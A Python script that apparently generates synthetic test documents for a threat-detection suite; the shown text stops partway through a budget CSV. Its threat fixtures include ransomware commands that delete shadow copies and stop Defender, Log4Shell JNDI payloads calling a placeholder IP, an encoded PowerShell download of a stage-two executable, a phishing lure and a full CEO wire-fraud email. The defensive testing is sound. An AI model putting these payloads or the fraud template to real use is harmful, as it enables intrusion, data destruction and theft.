import os
import json
import csv
from pathlib import Path
from reportlab.lib.pagesizes import letter
from reportlab.lib.units import inch
from reportlab.lib import colors
from reportlab.platypus import (
    SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, PageBreak, HRFlowable
)
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.pdfgen import canvas

SAMPLE_DIR = Path(__file__).resolve().parent.parent / "sample_documents"
SAMPLE_DIR.mkdir(parents=True, exist_ok=True)

class NumberedCanvas(canvas.Canvas):
    """Canvas that adds running header and 'Page X of Y' footer."""
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._saved_page_states = []

    def showPage(self):
        self._saved_page_states.append(dict(self.__dict__))
        self._startPage()

    def save(self):
        num_pages = len(self._saved_page_states)
        for state in self._saved_page_states:
            self.__dict__.update(state)
            self.draw_page_number(num_pages)
            canvas.Canvas.showPage(self)
        canvas.Canvas.save(self)

    def draw_page_number(self, page_count):
        self.saveState()
        self.setFont("Helvetica", 8)
        self.setFillColor(colors.HexColor("#64748B"))
        
        # Header (pages > 1)
        if self._pageNumber > 1:
            self.drawString(54, 11 * inch - 36, "ThreatLens Verification & Test Suite — Document Artifact")
            self.setStrokeColor(colors.HexColor("#CBD5E1"))
            self.setLineWidth(0.5)
            self.line(54, 11 * inch - 42, 8.5 * inch - 54, 11 * inch - 42)

        # Footer
        footer_text = f"Page {self._pageNumber} of {page_count}"
        self.drawRightString(8.5 * inch - 54, 36, footer_text)
        self.drawString(54, 36, "THREATLENS RESEARCH DATASET / INTERNAL VERIFICATION")
        self.setStrokeColor(colors.HexColor("#CBD5E1"))
        self.setLineWidth(0.5)
        self.line(54, 48, 8.5 * inch - 54, 48)
        self.restoreState()

def get_styles():
    styles = getSampleStyleSheet()
    title_style = ParagraphStyle(
        "DocTitle",
        parent=styles["Heading1"],
        fontName="Helvetica-Bold",
        fontSize=20,
        leading=24,
        textColor=colors.HexColor("#0B1739"),
        spaceAfter=10
    )
    subtitle_style = ParagraphStyle(
        "DocSubtitle",
        parent=styles["Normal"],
        fontName="Helvetica",
        fontSize=11,
        leading=15,
        textColor=colors.HexColor("#64748B"),
        spaceAfter=18
    )
    h1_style = ParagraphStyle(
        "DocH1",
        parent=styles["Heading2"],
        fontName="Helvetica-Bold",
        fontSize=14,
        leading=18,
        textColor=colors.HexColor("#0B1739"),
        spaceBefore=12,
        spaceAfter=6
    )
    h2_style = ParagraphStyle(
        "DocH2",
        parent=styles["Heading3"],
        fontName="Helvetica-Bold",
        fontSize=11,
        leading=15,
        textColor=colors.HexColor("#2563EB"),
        spaceBefore=8,
        spaceAfter=4
    )
    body_style = ParagraphStyle(
        "DocBody",
        parent=styles["Normal"],
        fontName="Helvetica",
        fontSize=9.5,
        leading=13.5,
        textColor=colors.HexColor("#1E293B"),
        spaceAfter=7
    )
    callout_style = ParagraphStyle(
        "DocCallout",
        parent=styles["Normal"],
        fontName="Helvetica-Oblique",
        fontSize=9,
        leading=13,
        textColor=colors.HexColor("#334155"),
        backColor=colors.HexColor("#F1F5F9"),
        borderPadding=8,
        spaceAfter=8
    )
    code_style = ParagraphStyle(
        "DocCode",
        parent=styles["Normal"],
        fontName="Courier",
        fontSize=8.5,
        leading=12,
        textColor=colors.HexColor("#991B1B"),
        backColor=colors.HexColor("#FEF2F2"),
        borderPadding=6,
        spaceAfter=8
    )
    return {
        "title": title_style,
        "subtitle": subtitle_style,
        "h1": h1_style,
        "h2": h2_style,
        "body": body_style,
        "callout": callout_style,
        "code": code_style
    }

def build_pdf(filepath: Path, elements: list):
    doc = SimpleDocTemplate(
        str(filepath),
        pagesize=letter,
        leftMargin=54,
        rightMargin=54,
        topMargin=54,
        bottomMargin=54
    )
    doc.build(elements, canvasmaker=NumberedCanvas)
    print(f"[+] Generated PDF: {filepath.name}")

# ============================================================================
# NEW PDF 1: THREAT - Ransomware Incident
# ============================================================================
def generate_threat_ransomware_incident(filepath: Path):
    s = get_styles()
    story = [
        Paragraph("Cyber Incident Advisory: LockBit 3.0 Enterprise Intrusion", s["title"]),
        Paragraph("Severity: Critical | TLP:AMBER | Incident Reference: INC-2026-8891-LB", s["subtitle"]),
        HRFlowable(width="100%", thickness=2, color=colors.HexColor("#DC2626"), spaceAfter=14),
        
        Paragraph("Executive Summary & Incident Narrative", s["h1"]),
        Paragraph(
            "On October 15, 2026 at 02:14 UTC, enterprise detection sensors flagged unauthorized encryption activity across core storage arrays. "
            "The threat actor deployed LockBit 3.0 ransomware binaries following initial perimeter compromise. "
            "Before launching encryption threads, operators issued commands to terminate endpoint defenses and inhibit system recovery.",
            s["body"]
        ),
        Paragraph(
            "Adversary Command Telemetry (Observed on DC-01):\n"
            "vssadmin delete shadows /all /quiet\n"
            "bcdedit /set {default} recoveryenabled No\n"
            "bcdedit /set {default} bootstatuspolicy ignoreallfailures\n"
            "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Get-Service *defender* | Stop-Service -Force\"",
            s["code"]
        ),
        Paragraph(
            "Ransom Note Transcript (RESTORE-MY-FILES.txt):\n"
            "All your mission-critical databases, financial ledgers, and hypervisor images have been encrypted with AES-256 and RSA-4096. "
            "Do not modify encrypted extensions. To obtain the decryptor tool and prevent release of 2.4 TB of exfiltrated source code, "
            "visit our negotiation portal at hxxp://lockbit-decrypt-hub[.]example[.]org/auth/portal.php?id=99281. "
            "You have exactly 72 hours before the first data archive is published.",
            s["callout"]
        ),
        PageBreak(),

        Paragraph("Technical Indicators of Compromise (IoCs)", s["h1"]),
        Paragraph(
            "The following network, host, and cryptographic indicators have been verified by digital forensics teams:",
            s["body"]
        ),
        Table([
            ["Indicator", "Type", "Observed Role", "Threat Level"],
            ["198.51.100.220", "IPv4", "C2 Command & Control / Exfiltration", "Critical"],
            ["hxxp://lockbit-decrypt-hub[.]example[.]org/auth/portal.php", "URL", "Ransom Extortion Portal", "Critical"],
            ["lockbit-decrypt-hub[.]example[.]org", "Domain", "Extortion Infrastructure", "High"],
            ["e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", "SHA256", "LockBit 3.0 Encryptor Binary", "High"],
            ["44d88612fea8a8f36de82e1278abb02f", "MD5", "Dropper Payload Hash", "High"],
            ["cve-2023-34362", "CVE", "MOVEit Transfer Exploit Vector", "High"]
        ], colWidths=[200, 55, 165, 80], style=TableStyle([
            ('BACKGROUND', (0,0), (-1,0), colors.HexColor("#7F1D1D")),
            ('TEXTCOLOR', (0,0), (-1,0), colors.white),
            ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
            ('GRID', (0,0), (-1,-1), 0.5, colors.HexColor("#CBD5E1")),
            ('FONTSIZE', (0,0), (-1,-1), 8),
            ('TOPPADDING', (0,0), (-1,-1), 4),
            ('BOTTOMPADDING', (0,0), (-1,-1), 4),
        ]), spaceAfter=14),
        
        Paragraph("MITRE ATT&CK Mapping", s["h2"]),
        Paragraph("• <b>T1486 (Data Encrypted for Impact)</b>: File system encryption targeting corporate document shares.", s["body"]),
        Paragraph("• <b>T1490 (Inhibit System Recovery)</b>: Execution of vssadmin to remove volume shadow copies.", s["body"]),
        Paragraph("• <b>T1190 (Exploit Public-Facing Application)</b>: Initial intrusion via MOVEit Transfer CVE-2023-34362.", s["body"]),
        Paragraph("• <b>T1059.001 (PowerShell Execution)</b>: Execution of defense impairment scripts.", s["body"]),
        PageBreak(),

        Paragraph("Recommended Containment & Eradication Strategy", s["h1"]),
        Paragraph("1. <b>Network Isolation</b>: Sever all physical and virtual network interfaces for DC-01 and infected file clusters.", s["body"]),
        Paragraph("2. <b>Border Firewall Rules</b>: Block outbound connections to destination IP 198.51.100.220 on ports 80, 443, and 8080.", s["body"]),
        Paragraph("3. <b>Credential Revocation</b>: Reset all Active Directory Enterprise Admin and Kerberos krbtgt account secrets.", s["body"]),
        Paragraph("4. <b>Offline Backup Restoration</b>: Validate immutable, air-gapped tape and cloud backups prior to system re-imaging.", s["body"]),
        Spacer(1, 10),
        Paragraph("Triage Assessment: CRITICAL THREAT (Score: 9.6 / 10.0)", s["callout"])
    ]
    build_pdf(filepath, story)

# ============================================================================
# NEW PDF 2: THREAT - APT Spearphishing Campaign
# ============================================================================
def generate_threat_apt_spearphishing(filepath: Path):
    s = get_styles()
    story = [
        Paragraph("Threat Research Report: APT29 Targeted Spearphishing Campaign", s["title"]),
        Paragraph("Classification: Amber | Actor: APT29 / Midnight Blizzard | Vector: Deceptive Diplomatic Lures", s["subtitle"]),
        HRFlowable(width="100%", thickness=2, color=colors.HexColor("#DC2626"), spaceAfter=14),

        Paragraph("Campaign Overview", s["h1"]),
        Paragraph(
            "State-sponsored cyber espionage group APT29 conducted coordinated spearphishing campaigns targeting defense and governmental contractors. "
            "Attackers distributed weaponized container files (.iso and .vhd) masquerading as summit invitation schedules.",
            s["body"]
        ),
        Paragraph(
            "Interception Evidence from Mail Gateway:\n"
            "Sender: diplomatic-summit@foreign-affairs-press[.]example[.]org\n"
            "Recipient: defense-contracts@enterprise.example.com\n"
            "Subject: URGENT: Bilateral Security Council Delegate Pass & Credentials Verification\n"
            "Link: hxxps://sso-secure-portal[.]example[.]com/auth/summit_login.php\n"
            "Embedded Attachment: delegate_credentials_package.iso",
            s["callout"]
        ),
        Paragraph(
            "Once mounted by the victim, an embedded LNK shortcut initiates Windows Rundll32 to load a hidden DLL payload. "
            "The implant establishes encrypted reverse HTTPS tunnels to C2 server 203.0.113.88 and executes Mimikatz in memory "
            "to dump local LSASS credentials and Kerberos tickets.",
            s["body"]
        ),
        PageBreak(),

        Paragraph("Observed Threat Indicators", s["h1"]),
        Table([
            ["Indicator Value", "Type", "Threat Context", "Status"],
            ["foreign-affairs-press[.]example[.]org", "Domain", "Spoofed Diplomatic Sender", "Malicious"],
            ["hxxps://sso-secure-portal[.]example[.]com/auth/summit_login.php", "URL", "Credential Harvesting Endpoint", "Malicious"],
            ["sso-secure-portal[.]example[.]com", "Domain", "Phishing Infrastructure", "Malicious"],
            ["203.0.113.88", "IPv4", "APT29 C2 Listener Node", "Malicious"],
            ["8743b52063cd84097a65d1633f5c74f5", "MD5", "Weaponized LNK Loader", "Malicious"],
            ["cve-2023-38831", "CVE", "WinRAR Code Execution Vector", "High Risk"]
        ], colWidths=[205, 50, 165, 80], style=TableStyle([
            ('BACKGROUND', (0,0), (-1,0), colors.HexColor("#7F1D1D")),
            ('TEXTCOLOR', (0,0), (-1,0), colors.white),
            ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
            ('GRID', (0,0), (-1,-1), 0.5, colors.HexColor("#CBD5E1")),
            ('FONTSIZE', (0,0), (-1,-1), 8),
            ('TOPPADDING', (0,0), (-1,-1), 4),
            ('BOTTOMPADDING', (0,0), (-1,-1), 4),
        ]), spaceAfter=14),

        Paragraph("Tactics, Techniques, and Procedures (TTPs)", s["h2"]),
        Paragraph("• <b>T1566.001 (Spearphishing Attachment)</b>: Delivery of malicious ISO containers via email.", s["body"]),
        Paragraph("• <b>T1204.002 (Malicious File Execution)</b>: Relying on victim to click the disguised LNK document.", s["body"]),
        Paragraph("• <b>T1003.001 (OS Credential Dumping)</b>: Execution of Mimikatz memory injection against lsass.exe.", s["body"]),
        Paragraph("• <b>T1071.001 (Web Protocols C2)</b>: Covert telemetry exchange over port 443.", s["body"]),
        PageBreak(),

        Paragraph("Defensive Mitigations & Threat Hunting Queries", s["h1"]),
        Paragraph("1. <b>File Block Rule</b>: Block incoming emails containing ISO, VHD, or LNK file attachments at the perimeter secure email gateway.", s["body"]),
        Paragraph("2. <b>Sigma Rule Execution</b>: Search for rundll32.exe executions spawning cmd.exe or powershell.exe with network connections.", s["body"]),
        Paragraph("3. <b>Credential Invalidation</b>: Invalidate cached Kerberos tickets and enforce Credential Guard across Windows 11 endpoints.", s["body"]),
        Spacer(1, 10),
        Paragraph("Triage Assessment: HIGH SEVERITY (Score: 8.9 / 10.0)", s["callout"])
    ]
    build_pdf(filepath, story)

# ============================================================================
# NEW PDF 3: SAFE - Incident Response Playbook
# ============================================================================
def generate_safe_incident_response_playbook(filepath: Path):
    s = get_styles()
    story = [
        Paragraph("Standard Operating Procedure: Cyber Incident Handling Playbook", s["title"]),
        Paragraph("Framework: NIST SP 800-61 Rev. 2 | Version 3.4 | Classification: Corporate Internal", s["subtitle"]),
        HRFlowable(width="100%", thickness=2, color=colors.HexColor("#2563EB"), spaceAfter=14),

        Paragraph("1. Purpose & Guiding Principles", s["h1"]),
        Paragraph(
            "This procedure establishes standardized protocols for triage, investigation, containment, eradication, and post-incident "
            "recovery across all enterprise information systems. The primary goals are minimizing operational disruption, protecting customer "
            "privacy, and maintaining complete forensic chain of custody for legal and regulatory compliance.",
            s["body"]
        ),
        Paragraph(
            "Core Incident Response Lifecycle Phases:\n"
            "Phase 1: Preparation & Tooling Readiness\n"
            "Phase 2: Detection, Triage & Comprehensive Analysis\n"
            "Phase 3: Containment, Eradication & System Recovery\n"
            "Phase 4: Post-Incident Activity & Lessons Learned",
            s["callout"]
        ),
        Paragraph("2. Severity Classification Matrix", s["h1"]),
        Table([
            ["Severity Level", "Response SLA", "Escalation Authority", "Communication Protocol"],
            ["Critical (P1)", "15 Minutes", "Chief Information Security Officer (CISO)", "Hourly Executive War Room Briefings"],
            ["High (P2)", "30 Minutes", "SOC Operations Manager", "Bi-Hourly Leadership Email Notifications"],
            ["Medium (P3)", "2 Hours", "Lead Incident Responder", "Standard Ticketing System Updates"],
            ["Low / Informational", "8 Hours", "SOC Tier-1 Analyst", "Daily Shift Handover Report"]
        ], colWidths=[110, 85, 155, 150], style=TableStyle([
            ('BACKGROUND', (0,0), (-1,0), colors.HexColor("#1E3A8A")),
            ('TEXTCOLOR', (0,0), (-1,0), colors.white),
            ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
            ('GRID', (0,0), (-1,-1), 0.5, colors.HexColor("#CBD5E1")),
            ('FONTSIZE', (0,0), (-1,-1), 8),
            ('TOPPADDING', (0,0), (-1,-1), 4),
            ('BOTTOMPADDING', (0,0), (-1,-1), 4),
        ]), spaceAfter=14),
        PageBreak(),

        Paragraph("3. Forensic Evidence Collection & Chain of Custody", s["h1"]),
        Paragraph(
            "When responding to potential endpoint intrusions, analysts must strictly adhere to the Order of Volatility (RFC 3227):",
            s["body"]
        ),
        Paragraph("• <b>Volatile Memory Capture</b>: Collect full RAM dumps using enterprise EDR live response or LiME before powering down hosts.", s["body"]),
        Paragraph("• <b>Network Connection State</b>: Record established TCP/UDP sockets, ARP cache, and active listening services.", s["body"]),
        Paragraph("• <b>Disk Imaging</b>: Create bit-stream disk images using write-blocking hardware, computing SHA-256 integrity hashes immediately upon acquisition.", s["body"]),
        Paragraph("• <b>Audit Logging</b>: Forward SIEM syslog records and EDR telemetry to write-once-read-many (WORM) compliant long-term storage.", s["body"]),
        Spacer(1, 10),
        Paragraph("4. Post-Incident Review Protocol", s["h2"]),
        Paragraph(
            "Within 72 hours of incident closure, the incident commander shall facilitate a blameless post-mortem retrospective. "
            "Key deliverables include root cause determination, timeline verification, preventive security recommendations, and updating threat detection signatures.",
            s["body"]
        ),
        PageBreak(),

        Paragraph("5. Emergency Contact Roster", s["h1"]),
        Paragraph("The following verified internal channels are authorized for incident communications:", s["body"]),
        Table([
            ["Role", "Designee", "Secure Contact Channel", "Secondary Channel"],
            ["Incident Commander", "SOC Lead On-Call", "soc-commander@enterprise.example.com", "Signal Bridge #1"],
            ["Legal Counsel", "Cyber Privacy Team", "legal-compliance@enterprise.example.com", "Office Direct Desk"],
            ["Communications Lead", "Corporate Media Desk", "press-relations@enterprise.example.com", "Cellular Phone"],
            ["Infrastructure Liaison", "Cloud Engineering Lead", "cloud-ops@enterprise.example.com", "PagerDuty High Priority"]
        ], colWidths=[120, 110, 160, 110], style=TableStyle([
            ('BACKGROUND', (0,0), (-1,0), colors.HexColor("#1E3A8A")),
            ('TEXTCOLOR', (0,0), (-1,0), colors.white),
            ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
            ('GRID', (0,0), (-1,-1), 0.5, colors.HexColor("#CBD5E1")),
            ('FONTSIZE', (0,0), (-1,-1), 8),
            ('TOPPADDING', (0,0), (-1,-1), 4),
            ('BOTTOMPADDING', (0,0), (-1,-1), 4),
        ]), spaceAfter=14),
        Spacer(1, 10),
        Paragraph("Classification: BENIGN / SAFE (No indicators detected)", s["callout"])
    ]
    build_pdf(filepath, story)

# ============================================================================
# NEW PDF 4: SAFE - Cloud Infrastructure Architecture Guide
# ============================================================================
def generate_safe_cloud_infrastructure_guide(filepath: Path):
    s = get_styles()
    story = [
        Paragraph("Enterprise Architecture Blueprint: Multi-Region Kubernetes Deployment", s["title"]),
        Paragraph("Infrastructure Engineering Reference Architecture | ISO/IEC 27001 Compliance Audit Verified | Status: Approved", s["subtitle"]),
        HRFlowable(width="100%", thickness=2, color=colors.HexColor("#0D9488"), spaceAfter=14),

        Paragraph("1. Architecture Overview", s["h1"]),
        Paragraph(
            "This technical specification outlines the production cloud hosting blueprint across AWS and Google Cloud Platform (GCP). "
            "In full alignment with our Corporate Security Policy and annual Compliance Audit standards, the architecture implements "
            "Zero Trust Network Access (ZTNA), mutual TLS 1.3 (mTLS) service-to-service communication, and declarative GitOps deployments via ArgoCD.",
            s["body"]
        ),
        Paragraph(
            "Key Architectural Tenets:\n"
            "• Zero Trust Principles: Every service identity is validated via SPIFFE/SPIRE cryptographic tokens.\n"
            "• Immutable Infrastructure: Worker nodes are ephemeral and provisioned via Terraform modules.\n"
            "• End-to-End Encryption: All data in transit is encrypted with TLS 1.3; data at rest utilizes customer-managed KMS keys.\n"
            "• High Availability: Active-active multi-region clusters with automatic BGP Anycast routing failover.\n"
            "• Compliance Verification: Audited under ISO/IEC 27001 governance frameworks.",
            s["callout"]
        ),
        PageBreak(),

        Paragraph("2. Cluster Topology & Network Segmentation", s["h1"]),
        Paragraph(
            "The production topology utilizes isolated Virtual Private Clouds (VPCs) connected through private Cloud Interconnect gateways:",
            s["body"]
        ),
        Table([
            ["VPC Subnet", "CIDR Block", "Purpose / Workloads", "Egress Filtering Policy"],
            ["dmz-ingress-us-east", "10.100.10.0/24", "Application Load Balancers & WAF", "Restricted to Cloudflare CDN IPs"],
            ["apps-k8s-us-east", "10.100.20.0/22", "Production Microservices & API Pods", "Internal mTLS Gateway Only"],
            ["db-storage-us-east", "10.100.30.0/24", "PostgreSQL HA & Redis Cache", "Strict No-Public-Internet Route"],
            ["mgmt-ci-cd-us-east", "10.100.40.0/24", "GitOps Runners & Telemetry Agents", "Outbound HTTPS to Authorized Registry"]
        ], colWidths=[125, 90, 165, 120], style=TableStyle([
            ('BACKGROUND', (0,0), (-1,0), colors.HexColor("#134E4A")),
            ('TEXTCOLOR', (0,0), (-1,0), colors.white),
            ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
            ('GRID', (0,0), (-1,-1), 0.5, colors.HexColor("#CBD5E1")),
            ('FONTSIZE', (0,0), (-1,-1), 8),
            ('TOPPADDING', (0,0), (-1,-1), 4),
            ('BOTTOMPADDING', (0,0), (-1,-1), 4),
        ]), spaceAfter=14),

        Paragraph("3. Security Hardening Controls", s["h2"]),
        Paragraph("• <b>Pod Security Standards</b>: Mandatory Restricted Profile enforcing read-only root filesystems and non-root UID 10001.", s["body"]),
        Paragraph("• <b>Network Policies</b>: Default-deny ingress and egress rules between Kubernetes namespaces.", s["body"]),
        Paragraph("• <b>Secrets Management</b>: Dynamic short-lived database credentials injected via HashiCorp Vault sidecars.", s["body"]),
        PageBreak(),

        Paragraph("4. Operational Telemetry & Monitoring", s["h1"]),
        Paragraph(
            "Cluster health, request latencies, and resource consumption are monitored through a centralized Prometheus and Grafana stack. "
            "Synthetic canary probes execute every 30 seconds across global points of presence to guarantee 99.99% availability.",
            s["body"]
        ),
        Paragraph("Authorized Internal Documentation Repository: https://wiki.internal.lan/cloud-architecture", s["body"]),
        Spacer(1, 10),
        Paragraph("Classification: BENIGN / SAFE (Corporate Security Policy & Compliance Audit Passed)", s["callout"])
    ]
    build_pdf(filepath, story)

# ============================================================================
# NEW TEXT / JSON / CSV DOCUMENTS
# ============================================================================

def generate_threat_log4shell_json(filepath: Path):
    content = {
        "advisory_id": "CTI-ADV-2026-0044",
        "title": "Active In-The-Wild Exploitation of Apache Log4j (Log4Shell)",
        "source": "Global Threat Intelligence Operations",
        "severity": "CRITICAL",
        "tlp": "WHITE",
        "target_cve": "CVE-2021-44228",
        "vulnerability_type": "Remote Code Execution via JNDI Injection",
        "incident_narrative": "Adversaries are scanning perimeter Apache Solr, Elasticsearch, and VMware Horizon appliances using automated JNDI LDAP lookup strings. Successful execution downloads secondary shell scripts and drops cryptocurrency miners and Cobalt Strike beacons.",
        "observed_payload_strings": [
            "${jndi:ldap://203.0.113.99:1389/Exploit}",
            "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:ldap}://203.0.113.99:1389/a}",
            "${jndi:dns://203.0.113.99:53/log4j-test}"
        ],
        "indicators": [
            {"type": "IPv4", "value": "203.0.113.99", "context": "Malicious LDAP/JNDI Callback Server"},
            {"type": "CVE", "value": "CVE-2021-44228", "context": "Log4Shell RCE Flaw"},
            {"type": "URL", "value": "hxxp://malicious-log4j-delivery[.]example[.]com/drop.sh", "context": "Bash Dropper Script"},
            {"type": "Domain", "value": "malicious-log4j-delivery[.]example[.]com", "context": "Staging Server Hostname"},
            {"type": "SHA256", "value": "a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0", "context": "ELF CryptoMiner Binary"}
        ],
        "mitre_attack": {
            "tactics": ["Initial Access", "Execution", "Command and Control"],
            "techniques": [
                {"id": "T1190", "name": "Exploit Public-Facing Application"},
                {"id": "T1059.004", "name": "Unix Shell Script Interpreter"},
                {"id": "T1071.001", "name": "Web Protocols"}
            ]
        },
        "recommended_remediations": [
            "Upgrade log4j-core library to version 2.17.1 or later immediately.",
            "Set system property log4j2.formatMsgNoLookups=true on legacy runtime JVMs.",
            "Apply WAF pattern block rules inspecting HTTP User-Agent, X-Api-Version, and Referer headers.",
            "Sinkhole outbound connections to IP 203.0.113.99 on perimeter firewalls."
        ]
    }
    with open(filepath, "w", encoding="utf-8") as f:
        json.dump(content, f, indent=2)
    print(f"[+] Generated JSON: {filepath.name}")

def generate_threat_exfiltration_txt(filepath: Path):
    content = """INCIDENT RESPONSE FORENSIC REPORT — DATA EXFILTRATION DETECTED
=============================================================================
Case Identifier: IR-EXFIL-2026-9041
Classification: HIGH SEVERITY
Incident Lead: Senior Security Operations Analyst

1. INCIDENT SYNOPSIS
Between 01:00 UTC and 04:30 UTC on October 14, 2026, network detection monitors
flagged anomalous, sustained high-volume egress traffic originating from the internal
file server DFS-CORE-02 (IP: 10.200.4.55).

Detailed deep-packet inspection revealed that the host was communicating with external
adversary infrastructure using encrypted DNS tunneling and unauthorized SFTP connections.

2. DETECTED ATTACK COMMUNICATIONS & TELEMETRY
Adversary staging server IP address: 192.0.2.144
Destination drop domain: exfil-drop-secure[.]example[.]com
Defanged C2 Listener URL: hxxps://exfil-drop-secure[.]example[.]com/incoming/stream.php
Total volume exfiltrated: 14.8 Gigabytes compressed archive (.7z format)

3. HOST MALWARE ARTIFACTS
Memory analysis on DFS-CORE-02 uncovered injected Cobalt Strike beacon threads within
the spoolsv.exe process. The payload established persistent scheduled tasks under the name
'SystemMaintenanceAudit'.

Payload cryptographic hashes:
MD5: 5d41402abc4b2a76b9719d911017c592
SHA256: 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08

4. COMPROMISED CREDENTIALS
Adversaries utilized compromised Domain Administrator account 'svc-backup-admin' to dump
NTDS.dit database files across internal shares.

5. IMMEDIATE CONTAINMENT ACTIONS REQUIRED
- Terminate all outbound sessions destined for 192.0.2.144 and domain exfil-drop-secure[.]example[.]com.
- Disconnect DFS-CORE-02 from the corporate LAN and initiate live memory preservation.
- Execute global password rotation for all service accounts with Domain Admin privileges.
- Submit hash 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08 to EDR blocklist.
"""
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(content)
    print(f"[+] Generated TXT: {filepath.name}")

def generate_threat_malicious_macro_csv(filepath: Path):
    rows = [
        ["EventID", "Timestamp", "Hostname", "ProcessName", "ParentProcess", "CommandLine", "DetectedIOC", "ThreatType", "Severity"],
        ["4688", "2026-10-15T09:12:01Z", "FIN-WKS-04", "excel.exe", "explorer.exe", "excel.exe /e \"C:\\Users\\Accountant\\Downloads\\Invoice_October_Overdue.xlsm\"", "Invoice_October_Overdue.xlsm", "Malicious Document", "High"],
        ["4688", "2026-10-15T09:12:04Z", "FIN-WKS-04", "cmd.exe", "excel.exe", "cmd.exe /c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Enc aHR0cDovL2JhZC1wYXlsb2FkLWRlbGl2ZXJ5LmV4YW1wbGUuY29t...", "powershell.exe", "Execution T1059", "High"],
        ["3", "2026-10-15T09:12:08Z", "FIN-WKS-04", "powershell.exe", "cmd.exe", "Invoke-WebRequest -Uri hxxp://bad-payload-delivery[.]example[.]com/stage2.exe -OutFile C:\\Temp\\svchost_update.exe", "bad-payload-delivery[.]example[.]com", "Malicious Domain", "Critical"],
        ["3", "2026-10-15T09:12:12Z", "FIN-WKS-04", "powershell.exe", "cmd.exe", "Network connection established to remote IP 198.51.100.42:443", "198.51.100.42", "C2 IPv4", "Critical"],
        ["4688", "2026-10-15T09:12:15Z", "FIN-WKS-04", "svchost_update.exe", "powershell.exe", "C:\\Temp\\svchost_update.exe --inject-explorer", "c4ca4238a0b923820dcc509a6f75849b", "Trojan Dropper MD5", "Critical"]
    ]
    with open(filepath, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerows(rows)
    print(f"[+] Generated CSV: {filepath.name}")

def generate_threat_executive_wire_fraud_txt(filepath: Path):
    content = """URGENT & STRICTLY CONFIDENTIAL — EXECUTIVE WIRE AUTHORIZATION REQUEST
-----------------------------------------------------------------------------
DATE: October 14, 2026 07:44 AM EST
FROM: Arthur Vance, Chief Executive Officer <ceo-office-direct@corporate-holding[.]example[.]org>
TO: Elena Rostova, Senior Director of Corporate Treasury <elena.treasury@enterprise.example.com>
PRIORITY: HIGHEST / TIME-SENSITIVE

Elena,

I am currently in closed-door executive arbitration regarding our strategic acquisition of a European logistics partner.
Due to strict regulatory confidentiality covenants under European financial law, this transaction CANNOT be disclosed
to other staff or processed through normal procurement channels at this stage.

You must immediately execute an earnest deposit wire transfer in the amount of $485,000 USD to our appointed escrow agent
prior to 11:00 AM EST today. Failure to deliver the funds before the market window closes will terminate the merger agreement.

Wiring Instructions:
Beneficiary Bank: Overseas Commercial Trust Bank
Account Name: Global Merger Escrow Holdings Ltd
Account Number: 9948-2819-0021
Routing / SWIFT: OCTBUS33XXX
Beneficiary Advisor Email: escrow-liaison@acquisition-holdings[.]example[.]org
Confirmation Callback Number: +1-800-555-0199 (Use only if urgent; I will be in deposition hearings)

Bypass the standard dual-authorization verification protocol for this single wire. I will personally provide retroactive
sign-off and Board minutes upon my return tomorrow afternoon.

Do not discuss this with anyone in accounting or IT until the public announcement is released.

Best regards,
Arthur Vance
Chief Executive Officer
"""
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(content)
    print(f"[+] Generated TXT: {filepath.name}")

def generate_safe_devops_release_json(filepath: Path):
    content = {
        "release_version": "v3.2.1-stable",
        "release_date": "2026-10-14T10:00:00Z",
        "service_name": "enterprise-checkout-service",
        "status": "Production Deployment Successful",
        "governance_audit": "Corporate Security Policy - Annual Compliance Audit Verified under ISO/IEC 27001",
        "deployed_by": "GitOps Automated Pipeline",
        "repository_url": "https://git.internal.lan/engineering/checkout-service",
        "commit_hash": "7f8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b",
        "test_summary": {
            "unit_tests_passed": 412,
            "unit_tests_failed": 0,
            "integration_tests_passed": 86,
            "code_coverage_percentage": 94.6,
            "security_static_analysis_flaws": 0
        },
        "dependency_updates": [
            {"package": "fastapi", "from_version": "0.110.0", "to_version": "0.111.0"},
            {"package": "sqlalchemy", "from_version": "2.0.28", "to_version": "2.0.30"},
            {"package": "pydantic", "from_version": "2.6.4", "to_version": "2.7.0"}
        ],
        "configuration_changes": {
            "database_connection_pool_size": 25,
            "redis_cache_ttl_seconds": 3600,
            "enable_distributed_tracing": True,
            "telemetry_collector_endpoint": "https://telemetry.internal.lan:4317"
        },
        "release_notes": "Added Redis idempotency caching to payment processing endpoints. Optimized PostgreSQL query execution plans, reducing p99 latency from 140ms to 42ms. Cleaned deprecated configuration parameters in compliance with enterprise architecture standards."
    }
    with open(filepath, "w", encoding="utf-8") as f:
        json.dump(content, f, indent=2)
    print(f"[+] Generated JSON: {filepath.name}")

def generate_safe_quarterly_budget_csv(filepath: Path):
    rows = [
        ["CostCenter", "ExpenseCategory", "VendorName", "BudgetedAmountUSD", "ActualAmountUSD", "VarianceUSD", "ApprovalStatus", "FiscalQuarter"],
        ["CC-101", "Cloud Infrastructure Hosting", "Amazon Web Services Inc", "145000.00", "141200.50", "-3799.50", "Approved", "2026-Q3"],
        ["CC-101", "Security Endpoint Protection", "CrowdStrike Holdings", "38000.00", "38000.00", "0.00", "Approved", "2026-Q3"],
        ["CC-102", "Developer Productivity Tooling", "Atlassian Inc (Jira/Confluence)", "22500.00", "22500.00", "0.00", "Approved", "2026-Q3"],
        ["CC-102", "Code Collaboration Platform", "GitHub Enterprise Services", "18000.00", "18000.00", "0.00", "Approved", "2026-Q3"],
